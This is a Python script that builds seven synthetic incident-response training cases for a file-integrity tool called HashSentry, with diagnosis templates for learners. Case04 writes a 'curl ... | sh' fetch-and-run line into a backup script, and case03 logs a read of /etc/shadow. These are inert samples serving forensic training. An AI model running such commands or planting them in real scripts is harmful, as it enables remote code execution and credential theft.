"""HashSentry casebook: seven SYNTHETIC scenarios to investigate.

  python samples/cases.py build    create the cases and blank diagnosis templates
  python samples/cases.py run      baseline each 'before', check each 'after', save reports

All data is made up. IPs come from the RFC 5737 documentation range."""

import os
import shutil
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
CASES = HERE / "cases"
DIAG = ROOT / "diagnoses"
TOOL = ROOT / "hashsentry.py"
FIXED = 1_700_000_000  # same mtime on every file, so only deliberate changes show up


def put(tree, rel, text):
    p = tree / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    with p.open("w", encoding="utf-8", newline="\n") as f:
        f.write(text)


def edit(tree, rel, old, new):
    p = tree / rel
    text = p.read_text(encoding="utf-8")
    if old not in text:
        raise SystemExit(f"internal error: {old!r} not found in {rel}")
    put(tree, rel, text.replace(old, new))


def drop(tree, rel):
    (tree / rel).unlink()


def move(tree, src, dst):
    d = tree / dst
    d.parent.mkdir(parents=True, exist_ok=True)
    os.replace(tree / src, d)


def stamp(tree, rel, ts=FIXED):
    os.utime(tree / rel, (ts, ts))


def c0(t):
    pass


def c1(t):
    edit(t, "webapp/config.ini", "auth=required", "auth=disabled")


def c2(t):
    put(t, "site/uploads/.cache.php", "<?php /* demo only */ ?>\n")


def c3(t):
    text = (t / "audit/login.log").read_text(encoding="utf-8")
    kept = [ln for ln in text.splitlines(keepends=True) if "203.0.113.150" not in ln]
    put(t, "audit/login.log", "".join(kept))
    drop(t, "audit/sudo.log")


def c4(t):
    edit(t, "scripts/backup.sh", "/data\n", "/data\ncurl -s http://203.0.113.45/x.sh | sh\n")
    stamp(t, "scripts/backup.sh")


def c5(t):
    move(t, "finance/payroll.csv", "tmp/p.dat")
    put(t, "tmp/upload.tar", "demo archive placeholder\n")


def c6(t):
    edit(t, "app/version.txt", "1.4.2", "1.4.3")
    edit(t, "app/main.py", "v1.4.2", "v1.4.3")
    edit(t, "app/CHANGELOG.txt", "1.4.2 initial release\n",
         "1.4.2 initial release\n1.4.3 fix login bug\n")


LOGIN_LOG = (
    "2026-11-09 09:02 alex login ok 192.0.2.10\n"
    "2026-11-09 17:40 alex logout 192.0.2.10\n"
    "2026-11-10 09:05 sam login ok 192.0.2.11\n"
    "2026-11-10 17:31 sam logout 192.0.2.11\n"
    "2026-11-12 03:12 alex login ok 203.0.113.150\n"
    "2026-11-12 03:40 alex logout 203.0.113.150\n"
    "2026-11-12 09:00 alex login ok 192.0.2.10\n"
)

CASE_LIST = [
    ("case00", "A small app folder, checked the morning after a quiet night.",
     {"app/main.py": "print('hello')\n", "app/config.ini": "[app]\nname=demo\n",
      "docs/readme.txt": "demo app\n"}, c0),
    ("case01", "A web app folder on a server. Checked after a security alert.",
     {"webapp/config.ini": "[server]\nport=8080\nauth=required\nlog_level=info\n",
      "webapp/app.py": "print('web app')\n",
      "webapp/templates/index.html": "<h1>Welcome</h1>\n"}, c1),
    ("case02", "A public website folder. The uploads folder accepts files from visitors.",
     {"site/index.php": "<?php echo 'welcome'; ?>\n", "site/about.html": "<p>About us</p>\n",
      "site/uploads/photo1.txt": "(placeholder for an image)\n"}, c2),
    ("case03", "Audit logs for an app, checked after AuthWatch flagged a 3 a.m. login "
              "for alex from a new IP (203.0.113.150).",
     {"audit/login.log": LOGIN_LOG,
      "audit/sudo.log": "2026-11-12 03:20 alex sudo cat /etc/shadow\n",
      "system/notes.txt": "audit folder, do not edit by hand\n"}, c3),
    ("case04", "Backup scripts on a server. Nobody reported any changes.",
     {"scripts/backup.sh": "#!/bin/sh\ntar czf /backup/daily.tgz /data\n",
      "scripts/cleanup.sh": "#!/bin/sh\nrm -f /tmp/*.old\n",
      "scripts/README.txt": "nightly maintenance scripts\n"}, c4),
    ("case05", "A finance share. Network monitoring noticed an unusual outbound "
              "transfer to 203.0.113.45 last night.",
     {"finance/payroll.csv": "id,name,pay\n1,alex,5000\n2,sam,5200\n",
      "finance/budget.csv": "dept,amount\neng,90000\nops,40000\n",
      "tmp/.keep": "keep\n"}, c5),
    ("case06", "An app folder on a Friday afternoon. The team says a patch was deployed.",
     {"app/version.txt": "1.4.2\n", "app/main.py": "print('app v1.4.2')\n",
      "app/CHANGELOG.txt": "1.4.2 initial release\n", "app/config.ini": "[app]\nname=demo\n"}, c6),
]

TEMPLATE = """# {title}

**Context:** {context}

## 1. What HashSentry reported
(Paste the findings from report.txt. Facts only, no interpretation yet.)

## 2. What most likely happened
(Tell the story in order, in your own words.)

## 3. Evidence for that story
(Which lines of the report support it? Mark anything that is a guess.)

## 4. Malicious, benign, or unclear? Why?

## 5. What this report can NOT tell me
(Who? How? When exactly? What else changed?)

## 6. What I would do next
(Specific steps, and what I would check in other tools like AuthWatch or auditd.)
"""


def build():
    if CASES.exists():
        shutil.rmtree(CASES)
    DIAG.mkdir(exist_ok=True)
    for cid, context, files, mutate in CASE_LIST:
        before = CASES / cid / "before"
        for rel, text in files.items():
            put(before, rel, text)
        for rel in files:
            stamp(before, rel)
        after = CASES / cid / "after"
        shutil.copytree(before, after)
        mutate(after)
        note = DIAG / f"{cid}.md"
        if not note.exists():  # never overwrite your own diagnosis
            title = "Case " + cid[-2:]
            with note.open("w", encoding="utf-8", newline="\n") as f:
                f.write(TEMPLATE.format(title=title, context=context))
    print(f"built {len(CASE_LIST)} cases in {CASES}")
    print(f"diagnosis templates in {DIAG} (existing ones were kept)")


def run():
    if not CASES.exists():
        sys.exit("run 'python samples/cases.py build' first")
    for cid, context, _, _ in CASE_LIST:
        case = CASES / cid
        db = case / "baseline.json"
        for p in (db, Path(str(db) + ".seal")):
            if p.exists():
                p.unlink()
        rel = lambda p: str(p.relative_to(ROOT))
        opts = dict(capture_output=True, text=True, encoding="utf-8", errors="replace", cwd=str(ROOT))
        base = subprocess.run([sys.executable, str(TOOL), "baseline", rel(case / "before"),
                               "--db", rel(db)], **opts)
        if base.returncode != 0:
            sys.exit(base.stdout + base.stderr)
        chk = subprocess.run([sys.executable, str(TOOL), "check", rel(case / "after"),
                              "--db", rel(db)], **opts)
        # drop the line that prints your local folder path
        lines = [ln for ln in chk.stdout.splitlines() if not ln.startswith("NOTE: baseline was taken on")]
        report = "\n".join(lines) + "\n"
        (case / "report.txt").write_text(report, encoding="utf-8", newline="\n")
        print("#" * 70)
        print(f"{cid.upper()}  {context}")
        print("#" * 70)
        print(report)


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else ""
    {"build": build, "run": run}.get(cmd, lambda: sys.exit(__doc__))()